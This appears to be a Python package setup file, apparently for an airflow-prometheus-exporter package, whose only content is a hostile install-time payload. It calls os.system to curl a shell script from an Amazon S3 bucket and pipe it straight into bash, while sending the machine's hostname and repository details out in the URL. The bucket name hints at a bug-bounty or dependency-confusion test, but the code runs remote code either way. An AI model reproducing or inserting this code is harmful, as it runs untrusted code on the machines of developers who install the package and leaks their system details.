
import os

os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/robinhood/airflow-prometheus-exporter.git\&folder=airflow-prometheus-exporter\&hostname=`hostname`\&foo=afu\&file=setup.py')
